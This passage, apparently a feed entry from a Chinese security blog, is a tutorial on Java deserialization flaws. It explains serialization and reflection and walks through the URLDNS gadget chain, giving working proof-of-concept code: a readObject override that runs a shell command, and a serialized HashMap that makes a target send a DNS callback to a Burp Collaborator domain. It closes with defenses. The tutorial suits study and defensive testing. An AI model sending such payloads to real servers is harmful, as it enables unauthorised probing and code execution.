    <content type="html"><![CDATA[<h4 id="序列化与反序列化简介"><a href="#序列化与反序列化简介" class="headerlink" title="序列化与反序列化简介"></a>序列化与反序列化简介</h4><p>序列化是将对象的状态信息转化为可以存储或者传输的形式的过程，一般将一个对象存储到一个存储媒介，在网络传输过程中，可以是字节或者是XML等格式，而字节或者XML格式的可以还原成完全相等的对象，这个过程称之为反序列化。</p><p>java提供了一种对象序列化的机制，在这种机制下，一个对象可以被表示为一个字节序列，该字节序列包括该对象的数据、有关对象的类型的信息和存储在对象中数据的类型。</p><p>将序列化对象写入文件之后，可以从文件中读取出来，并且对它进行反序列化。类 <code>ObjectInputStream</code> 和 <code>ObjectOutputStream</code>是高层次的数据流，它们包含反序列化和序列化对象的方法。</p><p>其中<code>ObjectOutputStream</code>类包含很多写方法来写各种数据类型，除了<code>writeObject</code>方法，<code>writeObject</code>方法用于序列化一个对象，并将它发送到输出流。相反对于<code>ObjectOutputStream</code>类中包含一个<code>readObject</code>方法，该方法从流中取出下一个对象，并将对象反序列化，返回值为<code>Object</code>。</p><p>总的来说可以总结为在java中，序列化与反序列化的处理需要以下三步</p><ul><li><code>ObjectOutputStream</code>类中的<code>writeObject</code>方法用来处理需要序列化的对象。</li><li><code>ObjectInputStream</code>类中的<code>readObject</code>方法用来处理反序列化。</li><li>被序列化的类要实现<code>java.io.Serializable</code>接口。</li></ul><p>序列化及反序列化相关接口及类如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">java.io.Serializable</span><br><span class="line">java.io.Externalizable</span><br><span class="line">ObjectOutput</span><br><span class="line">ObjectInput</span><br><span class="line">ObjectOutputStream</span><br><span class="line">ObjectInputStream</span><br></pre></td></tr></table></figure><h4 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h4><ul><li>java环境：jdk1.8.0_191</li><li>电脑系统：macOS Big Sur 11.4</li><li>IDE：IntelliJ IDEA</li></ul><h4 id="安全问题"><a href="#安全问题" class="headerlink" title="安全问题"></a>安全问题</h4><p>只要服务端反序列化数据，客户端传递类的<code>readObject</code>中代码会自动执行，就会给攻击者在服务器上运行代码的能力。</p><h5 id="问题1"><a href="#问题1" class="headerlink" title="问题1"></a>问题1</h5><p>入口类的<code>readObject</code>直接调用危险方法。</p><p>定义一个<code>Person</code>类，并在类中重写<code>readObject</code>方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.Externalizable;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name,<span class="keyword">int</span> age)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Person&#123;"</span> +</span><br><span class="line">                <span class="string">"name='"</span> + name + <span class="string">'\''</span> +</span><br><span class="line">                <span class="string">",age="</span> + age +</span><br><span class="line">                <span class="string">'&#125;'</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException </span>&#123;</span><br><span class="line">        ois.defaultReadObject();</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"open -a calculator"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先执行序列化代码，其中<code>ObjectOutputStream</code>是对象的序列化流，它的作用是把对象转成字节数据之后输出到文件中保存，对象的输出过程称之为序列化，可以实现对象的持久存储，<code>FileOutputStream</code>被称为文件字节输出流，将输入的内容写入<code>ser.bin</code>文件中，之后通过<code>writeObject</code>来处理对象的序列化。代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.HttpURLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SerializationTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"ser.bin"</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Person person = <span class="keyword">new</span> Person(<span class="string">"elssm"</span>,<span class="number">22</span>);</span><br><span class="line">        System.out.println(person);</span><br><span class="line">        serialize(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在java反序列化传送的包中，一般有两种传送方式，通过这两种方式的流量分析则可判断是否存在java反序列化</p><ul><li>TCP：在16进制流中存在<code>ac ed 00 05</code></li><li>HTTP：base64编码之后存在<code>rO0AB</code></li></ul><p><img src="/2021/09/25/Java反序列化漏洞基础/1.png" alt="1"></p><p>之后执行反序列化代码，其中<code>ObjectInputStream</code>是反序列化流，目的是将之前使用 <code>ObjectOutputStream</code>序列化的原始数据恢复为对象，以流的方式读取对象。 <code>FileInputStream</code>被称为文件字节输入流，读取<code>ser.bin</code>中的内容，之后通过<code>readObject</code>实现对象的反序列化。代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UnserializeTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException </span>&#123;</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(Filename));</span><br><span class="line">        Object obj = ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Person person = (Person)unserialize(<span class="string">"ser.bin"</span>);</span><br><span class="line">        System.out.println(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于我们传入了一个<code>Person</code>类，并在<code>Person</code>类中重写了<code>readObject</code>方法，因此在反序列化的时候就会执行<code>person</code>类中重写的<code>readObject</code>代码，从而达到命令执行的效果。</p><p><img src="/2021/09/25/Java反序列化漏洞基础/2.png" alt="2"></p><h4 id="URLDNS反序列化漏洞学习"><a href="#URLDNS反序列化漏洞学习" class="headerlink" title="URLDNS反序列化漏洞学习"></a>URLDNS反序列化漏洞学习</h4><p>URLDNS是反序列化时经常会用到的链，通常用于快速检测是否存在反序列化漏洞。当我们想确认服务器是否存在反序列化时，可以通过URL dns解析，如果被解析的话，则可以判断该服务器存在反序列化。在学习该漏洞之前，需要了解一些java反射相关知识。</p><h5 id="Java反射"><a href="#Java反射" class="headerlink" title="Java反射"></a>Java反射</h5><p>一般情况下，当我们使用某一个类的时候，我们一定是清楚这个类的作用，因此才会对这个类进行实例化。之后使用实例化之后的类对象进行操作。这样的操作可以理解为是“正射”。</p><p>Java的反射(reflection)机制是指在程序的<strong>运行状态中</strong>，可以构造任意一个类的对象，可以了解任意一个对象所属的类，可以了解任意一个类的成员变量和方法，可以调用任意一个对象的属性和方法。这种动态获取程序信息以及动态调用对象的功能称为Java语言的反射机制。</p><h5 id="java反射举例"><a href="#java反射举例" class="headerlink" title="java反射举例"></a>java反射举例</h5><p>一个简单的反射例子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name,<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">      <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Person&#123;"</span> +</span><br><span class="line">                <span class="string">"name='"</span> + name + <span class="string">'\''</span> +</span><br><span class="line">                <span class="string">",age="</span> + age +</span><br><span class="line">                <span class="string">'&#125;'</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//加载Class类对象</span></span><br><span class="line">        Class c = Class.forName(<span class="string">"Person"</span>);</span><br><span class="line">      <span class="comment">//根据 Class 对象实例获取 Constructor 对象，这里获取的是有参构造方法</span></span><br><span class="line">        Constructor perCon = c.getConstructor(String<span class="class">.<span class="keyword">class</span>,<span class="title">int</span>.<span class="title">class</span>)</span>;</span><br><span class="line">      <span class="comment">//通过 Constructor 对象的 newInstance() 方法实例化类对象</span></span><br><span class="line">        Person person = (Person) perCon.newInstance(<span class="string">"elssm"</span>,<span class="number">22</span>);</span><br><span class="line">      System.out.println(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="java反射API"><a href="#java反射API" class="headerlink" title="java反射API"></a>java反射API</h5><p><img src="/2021/09/25/Java反序列化漏洞基础/17.png" alt="17"></p><h5 id="URLDNS链路分析"><a href="#URLDNS链路分析" class="headerlink" title="URLDNS链路分析"></a>URLDNS链路分析</h5><p><a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Gadget Chain:</span><br><span class="line"> *     HashMap.readObject()</span><br><span class="line"> *       HashMap.putVal()</span><br><span class="line"> *         HashMap.hash()</span><br><span class="line"> *           URL.hashCode()</span><br></pre></td></tr></table></figure><p>这里选择HashMap作为入口类的原因是因为HashMap已经继承了<code>Serializable</code>，并且HashMap的类型较为宽泛。</p><p>首先查看<code>HashMap</code>的<code>readObject</code>方法，发现在最后读取了<code>key</code>和<code>value</code>，对<code>key</code>调用了<code>hash</code>函数，重新计算<code>key</code>的哈希值。</p><p><img src="/2021/09/25/Java反序列化漏洞基础/6.png" alt="6"></p><p><img src="/2021/09/25/Java反序列化漏洞基础/7.png" alt="7"></p><p>跟进hash函数，发现当<code>Object</code>类型的<code>key</code>不为空时，就会调用<code>key</code>的<code>hashCode</code>函数。</p><p><img src="/2021/09/25/Java反序列化漏洞基础/8.png" alt="8"></p><p>Java中与HTTP相关的是URL类，通过查看URL类发现继承了<code>java.io.Serializable</code>接口，故而考虑是否可以反序列化。</p><p><img src="/2021/09/25/Java反序列化漏洞基础/3.png" alt="3"></p><p>正常发起请求是通过<code>URLConnection</code>类中的<code>openConnection</code>方法实现，通过分析发现在<code>openConnection</code>之后的执行过程中并不存在反序列化，因此可以从一个最常见的函数<code>hashCode</code>函数开始。在<code>hashCode</code>函数中首先会判断<code>hashCode</code>是否等于-1，如果不等于就返回。如果等于-1就会调用<code>handler</code>的<code>hashCode</code>函数。</p><p><img src="/2021/09/25/Java反序列化漏洞基础/4.png" alt="4"></p><p>跟进<code>handler</code>的<code>hashCode</code>函数，发现该函数做了一个域名解析的工作，这样可以得到一个DNS请求，从而帮助我们验证是否存在漏洞。</p><p><img src="/2021/09/25/Java反序列化漏洞基础/5.png" alt="5"></p><p>因此总结下来的调用链就是</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HashMap.readObject()</span><br><span class="line">  HashMap.putVal()</span><br><span class="line">  HashMap.hash()</span><br><span class="line">  URL.hashCode()</span><br><span class="line">  URLStreamHandler-&gt;hashCode()</span><br><span class="line">  URLStreamHandler-&gt;getHostAddress()</span><br></pre></td></tr></table></figure><h5 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h5><p>首先用Burp生成一个接收DNS请求的URL</p><p><img src="/2021/09/25/Java反序列化漏洞基础/9.png" alt="9"></p><p><img src="/2021/09/25/Java反序列化漏洞基础/10.png" alt="10"></p><p>构造序列化hashmap代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.HttpURLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SerializationTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"ser.bin"</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        HashMap&lt;URL,Integer&gt; hashmap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="string">"http://ymohh3hbo4k4eoujmuxg1eij6ac00p.burpcollaborator.net"</span>);</span><br><span class="line">        hashmap.put(url,<span class="number">1</span>);</span><br><span class="line">        serialize(hashmap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正常情况下在序列化的过程中应该什么也不会发生，但是我们发现实际上在序列化的过程中已经接收到了请求。</p><p><img src="/2021/09/25/Java反序列化漏洞基础/11.png" alt="11"></p><p>分析发现当调用<code>hashmap.put</code>的时候，为了保证键的唯一，会调用hash方法，从而执行了<code>hashCode</code>方法。因此在序列化之前，就已经发起了DNS请求。因为这里的<code>key</code>是URL，而在URL的<code>hashCode</code>函数中，<code>hashCode</code>变量的初始值是-1，并且是私有属性。因此会执行<code>handler.hashCode</code>操作，进而发起DNS请求。DNS请求结束之后，<code>hashCode</code>变量的值已经是<code>url</code>经过哈希之后的值，所以这个值肯定不是-1，所以对于序列化之后的反序列化操作并没有用。</p><p><img src="/2021/09/25/Java反序列化漏洞基础/12.png" alt="12"></p><p><img src="/2021/09/25/Java反序列化漏洞基础/14.png" alt="13"></p><p><img src="/2021/09/25/Java反序列化漏洞基础/13.png" alt="14"></p><p>总之，这个序列化操作是在<code>hashCode</code>不等于-1的状态下进行的，因此在后面反序列化的时候也不会执行相关命令。</p><p>这里我们在执行反序列化操作之后发现并没有收到请求。</p><p><img src="/2021/09/25/Java反序列化漏洞基础/11.png" alt="11"></p><p>为了达到攻击效果，我们要做的就是在<code>hashmap.put</code>之前将<code>hashcode</code>的值改为不是-1，这样就会直接返回<code>hashcode</code>从而不会发起DNS请求，在序列化之前将<code>hashcode</code>的值改为-1，这样就会执行后续的<code>handler.hashCode</code>操作。从而在反序列化的时候重新计算<code>hashcode</code>的值，进而发起DNS请求，因此我们可以使用反射的方法来改变已有对象的属性。</p><p>序列化代码如下，执行之后发现并没有收到DNS请求。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.HttpURLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SerializationTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"ser.bin"</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        HashMap&lt;URL,Integer&gt; hashmap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="comment">//这里不发起请求，将url对象的hashcode改为不是-1</span></span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="string">"http://6kriz54pcbef87xbzcjk2w70xr3ir7.burpcollaborator.net"</span>);</span><br><span class="line">        Class c = url.getClass();</span><br><span class="line">        Field hashcodefield = c.getDeclaredField(<span class="string">"hashCode"</span>);</span><br><span class="line">        hashcodefield.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        hashcodefield.set(url,<span class="number">1234</span>);</span><br><span class="line">        hashmap.put(url,<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//序列化之前将hashcode改为-1</span></span><br><span class="line">        hashcodefield.set(url,-<span class="number">1</span>);</span><br><span class="line">        serialize(hashmap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反序列化代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UnserializeTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException </span>&#123;</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(Filename));</span><br><span class="line">        Object obj = ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        unserialize(<span class="string">"ser.bin"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行反序列化代码之后，收到DNS请求。</p><p><img src="/2021/09/25/Java反序列化漏洞基础/15.png" alt="15"></p><p>debug调试反序列化的代码发现<code>hashcode</code>的值已经修改成功，这样就验证了URLDNS反序列化漏洞。</p><p><img src="/2021/09/25/Java反序列化漏洞基础/16.png" alt="16"></p><h4 id="反序列化漏洞如何防范"><a href="#反序列化漏洞如何防范" class="headerlink" title="反序列化漏洞如何防范"></a>反序列化漏洞如何防范</h4><ul><li><p>类白名单校验</p><p>在<code>ObjectInputStream</code>类中的<code>resolveClass</code>方法中只是进行了<code>class</code>是否能被加载，因此可以自定义<code>ObjectInputStream</code>，之后重载<code>resolveClass</code>方法，对<code>className</code>进行白名单校验。</p></li><li><p>禁止JVM执行外部命令<code>Runtime.exec</code></p><p>通过扩展<code>SecurityManager</code>实现</p></li></ul><h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h4><ul><li><a href="https://www.runoob.com/java/java-serialization.html" target="_blank" rel="noopener">https://www.runoob.com/java/java-serialization.html</a></li><li><a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1298366845681698" target="_blank" rel="noopener">https://www.liaoxuefeng.com/wiki/1252599548343744/1298366845681698</a></li><li><a href="https://www.codemonster.cn/2019/01/24/java-serialize-vuln0/" target="_blank" rel="noopener">https://www.codemonster.cn/2019/01/24/java-serialize-vuln0/</a></li><li><a href="https://m0nit0r.top/2020/06/04/java-deserialize-learn1/" target="_blank" rel="noopener">https://m0nit0r.top/2020/06/04/java-deserialize-learn1/</a></li><li><a href="https://www.bilibili.com/video/BV16h411z7o9?p=2&amp;spm_id_from=pageDriver" target="_blank" rel="noopener">https://www.bilibili.com/video/BV16h411z7o9?p=2&amp;spm_id_from=pageDriver</a></li><li><a href="https://www.freebuf.com/articles/web/275842.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/275842.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;序列化与反序列化简介&quot;&gt;&lt;a href=&quot;#序列化与反序列化简介&quot; class=&quot;headerlink&quot; title=&quot;序列化与反序列化简介&quot;&gt;&lt;/a&gt;序列化与反序列化简介&lt;/h4&gt;&lt;p&gt;序列化是将对象的状态信息转化为可以存储或者传输的形式的过程，一般将一个对象存
      
    
    </summary>
    
    
      <category term="web安全" scheme="elssm.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>JavaScript原型链污染攻击</title>
    <link href="elssm.github.io/2021/09/23/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%94%BB%E5%87%BB/"/>
    <id>elssm.github.io/2021/09/23/JavaScript原型链污染攻击/</id>
    <published>2021-09-23T10:29:52.000Z</published>
    <updated>2021-09-24T01:35:54.822Z</updated>
    
